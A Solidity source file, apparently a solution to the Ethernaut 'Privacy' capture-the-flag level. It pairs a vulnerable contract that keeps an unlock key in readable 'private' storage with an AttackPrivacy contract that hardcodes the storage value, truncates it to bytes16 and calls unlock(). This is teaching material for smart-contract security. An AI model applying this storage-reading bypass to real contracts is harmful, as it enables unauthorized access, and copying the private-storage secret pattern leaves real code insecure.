
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}


contract AttackPrivacy {

    bytes32 public pwInBytes32 = 0x13d98f610413540b9a8acdd4f0573d4998f00a778218e54bbacda799e0db425d;

    bytes16 public pwInBytes16;

    Privacy public privacyContract;

    constructor(address _privacyContract){
        privacyContract = Privacy(_privacyContract);
    } 

    // converting private variable into actual password

    function convertBytes() public {
        pwInBytes16 = bytes16(pwInBytes32);
    }

    // unlock vulnerable contract
    function unlockPrivacyContract() public {
        privacyContract.unlock(pwInBytes16);
    }

}
